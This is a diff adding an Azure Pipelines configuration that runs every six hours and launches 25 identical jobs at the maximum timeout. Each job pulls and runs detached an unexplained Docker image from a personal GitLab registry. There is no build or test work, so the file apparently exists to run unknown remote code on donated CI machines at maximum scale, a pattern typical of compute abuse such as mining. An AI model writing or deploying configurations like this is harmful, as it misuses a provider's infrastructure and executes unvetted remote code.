@@ -1,0 +1,264 @@
+trigger:
+- main
+
+schedules:
+  - cron: "20 */6 * * *"   # Menjalankan pipeline setiap 6 jam pada menit 20 (6:20, 12:20, 18:20, 00:20 UTC)
+    displayName: "Run every 6 hours at 20 minutes past the hour"
+    branches:
+      include:
+        - main
+    always: true
+
+pool:
+  vmImage: 'ubuntu-22.04'  # Menggunakan Ubuntu 22.04 sebagai image
+
+jobs:
+- job: a
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: b
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: c
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: d
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: e
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: f
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: g
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: h
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: i
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: j
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: k
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: l
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: m
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: n
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: o
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: p
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: q
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: r
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: s
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: t
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: u
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: v
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: w
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: x
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+
+- job: y
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt install docker.io -y
+      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
+      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
